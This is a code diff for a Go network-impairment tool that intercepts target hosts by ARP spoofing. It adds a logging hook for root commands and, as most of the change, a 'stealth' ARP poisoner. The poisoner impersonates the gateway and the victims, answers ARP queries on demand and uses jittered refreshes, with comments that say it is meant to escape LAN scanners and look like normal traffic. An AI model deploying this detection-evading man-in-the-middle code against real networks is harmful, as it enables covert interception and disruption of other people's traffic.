@@ -28,6 +28,7 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"math/rand"
 	"net"
 	"os"
 	"os/exec"
@@ -36,7 +37,17 @@ import (
 	"sync"
 	"syscall"
 	"time"
+
+	"gnulte-go/internal/arpspoof"
 )
+
+var roll = rand.New(rand.NewSource(time.Now().UnixNano()))
+
+// verboseHook is the active transcript callback for the current session. It is
+// installed by Start and cleared when Start returns (the session config keeps
+// its own copy). Run under the session lock by callers that need ordering, but
+// in practice every call happens on the single main flow.
+var verboseHook func(line string)
 
 // Mode selects shape (impairment) or full block.
 type Mode int
@@ -63,6 +74,18 @@ type Config struct {
 
 	CaptureFile string // "" = none, "-" = stdout
 	Quiet       bool
+
+	// Stealth uses the in-Go, on-demand ARP spoofer instead of arpspoof(8):
+	// it answers ARP requests only when asked and re-arms caches with a slow
+	// jittered refresh, so other scanners on the LAN see far less activity.
+	Stealth bool
+
+	// Verbose, when set, receives every privilege-requiring command the engine
+	// runs (iptables, tc, arpspoof, tcpdump, sysctls) as a single shell line.
+	// It is the pre-permission command transcript: tools surface it to the
+	// operator live and fold it into the report so the exact commands that ran
+	// with root are always on the record. May be nil.
+	Verbose func(line string)
 }
 
 // Validate performs the same parameter sanity checks as the Bash version.
@@ -97,7 +120,12 @@ func (c *Config) Validate() error {
 // DepsCheck lists problems preventing a test (empty = ready).
 func DepsCheck(c *Config) []string {
 	var problems []string
-	for _, bin := range []string{"arpspoof", "tc", "ping"} {
+	deps := []string{"tc", "ping"}
+	if !c.Stealth {
+		// Stealth mode uses the in-Go ARP spoofer, so arpspoof(8) is not needed.
+		deps = append(deps, "arpspoof")
+	}
+	for _, bin := range deps {
 		if _, err := exec.LookPath(bin); err != nil {
 			problems = append(problems, fmt.Sprintf("missing required command: %s", bin))
 		}
@@ -216,6 +244,7 @@ func readForward() (string, error) {
 }
 
 func writeForward(v string) error {
+	traceCommand("echo", v, ">", "/proc/sys/net/ipv4/ip_forward")
 	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte(v+"\n"), 0o644)
 }
 
@@ -233,6 +262,11 @@ type Session struct {
 	restoreErr     []string
 	capture        *exec.Cmd
 	captureWait    chan struct{}
+
+	// Stealth ARP spoofing (in-Go, on-demand) replaces arpspoof children.
+	stealthSpoof  *arpspoof.Spoofer
+	stealthCancel context.CancelFunc
+	stealthDone   chan struct{}
 }
 
 // Start arms the test: forwarding, block rules, capture, spoofing, shaping.
@@ -251,6 +285,10 @@ func Start(ctx context.Context, cfg Config) (*Session, error) {
 	}
 
 	s := &Session{cfg: cfg, captureWait: make(chan struct{})}
+	if cfg.Verbose != nil {
+		verboseHook = cfg.Verbose
+		defer func() { verboseHook = nil }()
+	}
 	orig, err := readForward()
 	if err != nil {
 		return nil, err
@@ -310,11 +348,21 @@ func Start(ctx context.Context, cfg Config) (*Session, error) {
 }
 
 // runRoot runs a privilege-requiring command detached from the terminal's
-// process group, so a Ctrl+C on the session does not kill the restore.
+// process group, so a Ctrl+C on the session does not kill the restore. The
+// command line is reported to the transcript hook, if any.
 func runRoot(name string, args ...string) error {
+	traceCommand(append([]string{name}, args...)...)
 	cmd := exec.Command(name, args...)
 	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
 	return cmd.Run()
+}
+
+// traceCommand feeds a privilege-requiring command line to the transcript
+// hook installed by Start. Safe to call with no hook present.
+func traceCommand(pieces ...string) {
+	if verboseHook != nil {
+		verboseHook(strings.Join(pieces, " "))
+	}
 }
 
 func (s *Session) startCapture(ctx context.Context) error {
@@ -325,6 +373,7 @@ func (s *Session) startCapture(ctx context.Context) error {
 		}
 	}
 	cmd := exec.CommandContext(ctx, "tcpdump", captureArgs(&s.cfg, s.cfg.Interface)...)
+	traceCommand(append([]string{"tcpdump"}, captureArgs(&s.cfg, s.cfg.Interface)...)...)
 	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
 	if s.cfg.CaptureFile == "-" {
 		cmd.Stdout = os.Stdout
@@ -351,9 +400,13 @@ func (s *Session) startCapture(ctx context.Context) error {
 }
 
 func (s *Session) startSpoofs(ctx context.Context) error {
+	if s.cfg.Stealth {
+		return s.startStealthSpoof(ctx)
+	}
 	for _, t := range s.cfg.Targets {
 		// target -> we are the gateway
 		c1 := exec.CommandContext(ctx, "arpspoof", "-i", s.cfg.Interface, "-t", t, s.cfg.Gateway)
+		traceCommand("arpspoof", "-i", s.cfg.Interface, "-t", t, s.cfg.Gateway)
 		c1.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
 		c1.Stdout, c1.Stderr = nil, nil
 		if err := c1.Start(); err != nil {
@@ -368,6 +421,7 @@ func (s *Session) startSpoofs(ctx context.Context) error {
 
 		// gateway -> we are the target
 		c2 := exec.CommandContext(ctx, "arpspoof", "-i", s.cfg.Interface, "-t", s.cfg.Gateway, t)
+		traceCommand("arpspoof", "-i", s.cfg.Interface, "-t", s.cfg.Gateway, t)
 		c2.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
 		c2.Stdout, c2.Stderr = nil, nil
 		if err := c2.Start(); err != nil {
@@ -390,6 +444,151 @@ func (s *Session) killSpoof(c *exec.Cmd) {
 	}
 	_ = syscall.Kill(-c.Process.Pid, syscall.SIGTERM)
 	_, _ = c.Process.Wait()
+}
+
+// stealthTarget is one spoofed host: the victim's IP and learned MAC.
+type stealthTarget struct {
+	ip  net.IP
+	mac net.HardwareAddr
+}
+
+// startStealthSpoof arms the in-Go, on-demand ARP spoofer. It opens one
+// AF_PACKET socket on the interface, poisons each victim's cache with a single
+// directed unicast reply (we are the gateway), and then stays quiet: the pump
+// answers broadcast ARP requests only when a victim asks about the gateway (or
+// the gateway asks about a victim) and re-arms caches with a slow jittered
+// refresh so the poison never expires. Unlike arpspoof(8) it sends no
+// heartbeat of unsolicited replies, so an observer running its own ARP sweep
+// sees ordinary-looking request/answer traffic at most.
+func (s *Session) startStealthSpoof(ctx context.Context) error {
+	sp, err := arpspoof.Open(s.cfg.Interface)
+	if err != nil {
+		return fmt.Errorf("stealth ARP: %v", err)
+	}
+	gw := net.ParseIP(s.cfg.Gateway)
+	if gw == nil {
+		_ = sp.Close()
+		return errors.New("stealth ARP: invalid gateway address")
+	}
+	targets := make([]stealthTarget, 0, len(s.cfg.Targets))
+	for _, t := range s.cfg.Targets {
+		mac, err := arpLookupMAC(s.cfg.Interface, t)
+		if err != nil {
+			_ = sp.Close()
+			return fmt.Errorf("stealth ARP: %v", err)
+		}
+		targets = append(targets, stealthTarget{ip: net.ParseIP(t), mac: mac})
+	}
+	// Arm each victim's cache once: an unsolicited unicast reply is how real
+	// routers announce a link change, so it reads as normal traffic.
+	for _, e := range targets {
+		if err := sp.SendReply(e.mac, e.ip, gw); err != nil {
+			_ = sp.Close()
+			return fmt.Errorf("stealth ARP: %v", err)
+		}
+	}
+	ctx, cancel := context.WithCancel(ctx)
+	s.stealthSpoof = sp
+	s.stealthCancel = cancel
+	s.stealthDone = make(chan struct{})
+	go s.stealthPump(ctx, sp, gw, targets)
+	return nil
+}
+
+// stealthPump listens for ARP requests and re-arms caches on a slow, jittered
+// schedule. It never floods: no unsolicited broadcast, no second-by-second
+// heartbeat, exactly one reply per relevant question.
+func (s *Session) stealthPump(ctx context.Context, sp *arpspoof.Spoofer, gw net.IP, targets []stealthTarget) {
+	defer close(s.stealthDone)
+	nextRefresh := time.Now().Add(stealthInterval())
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-time.After(100 * time.Millisecond):
+		}
+		if time.Now().After(nextRefresh) {
+			for _, e := range targets {
+				_ = sp.SendReply(e.mac, e.ip, gw)
+			}
+			nextRefresh = time.Now().Add(stealthInterval())
+		}
+		// Drain any pending requests (bounded so one request can't hog the loop).
+		for i := 0; i < 64; i++ {
+			fromMAC, fromIP, asked, ok, err := sp.ReadRequest()
+			if err != nil {
+				return
+			}
+			if !ok {
+				break // nothing waiting (EAGAIN)
+			}
+			if sp.IsLocal(fromMAC) {
+				continue // our own echo
+			}
+			if asked.Equal(gw) && ipInTargets(fromIP, targets) {
+				// A victim wants to know who the gateway is. We answer.
+				_ = sp.SendReply(fromMAC, fromIP, gw)
+				continue
+			}
+			if fromIP.Equal(gw) {
+				// The gateway wants a victim's MAC. We claim to be them.
+				for _, e := range targets {
+					if asked.Equal(e.ip) {
+						_ = sp.SendReply(fromMAC, asked, e.ip)
+						break
+					}
+				}
+			}
+		}
+	}
+}
+
+// stealthInterval returns the base refresh period (≈30s) with ±25% jitter so a
+// scanner correlating refresh cadence sees irregular, human-ordinary timing.
+func stealthInterval() time.Duration {
+	return time.Duration(22500+int(roll.Intn(15001))) * time.Millisecond
+}
+
+func ipInTargets(ip net.IP, targets []stealthTarget) bool {
+	for _, e := range targets {
+		if e.ip.Equal(ip) {
+			return true
+		}
+	}
+	return false
+}
+
+// arpLookupMAC resolves ip's MAC via the kernel ARP table, asking once with
+// arping if it is not cached yet (a victim was just pinged, so it usually is).
+func arpLookupMAC(iface, ip string) (net.HardwareAddr, error) {
+	if hw := macFromProcARP(iface, ip); hw != nil {
+		return hw, nil
+	}
+	if _, err := exec.LookPath("arping"); err == nil {
+		_ = runRoot("arping", "-q", "-c", "1", "-w", "2", "-I", iface, ip)
+	}
+	if hw := macFromProcARP(iface, ip); hw != nil {
+		return hw, nil
+	}
+	return nil, fmt.Errorf("cannot resolve MAC for %s (run a ping first)", ip)
+}
+
+func macFromProcARP(iface, ip string) net.HardwareAddr {
+	data, err := os.ReadFile("/proc/net/arp")
+	if err != nil {
+		return nil
+	}
+	for _, line := range strings.Split(string(data), "\n") {
+		f := strings.Fields(line)
+		if len(f) < 6 || f[0] != ip || f[5] != iface {
+			continue
+		}
+		hw, err := net.ParseMAC(f[3])
+		if err == nil && len(hw) == 6 {
+			return hw
+		}
+	}
+	return nil
 }
 
 func (s *Session) applyTC(ctx context.Context) error {
@@ -438,6 +637,19 @@ func (s *Session) UpdateParams(c Config) error {
 }
 
 func (s *Session) stopSpoofs() {
+	// Stealth spoofer first: it shares the session via fields, so tidy it
+	// before the classic arpspoof children.
+	if s.stealthSpoof != nil {
+		if s.stealthCancel != nil {
+			s.stealthCancel()
+		}
+		if s.stealthDone != nil {
+			<-s.stealthDone
+		}
+		_ = s.stealthSpoof.Close()
+		s.stealthSpoof = nil
+		s.stealthCancel, s.stealthDone = nil, nil
+	}
 	for _, c := range s.spoofs {
 		s.killSpoof(c)
 	}
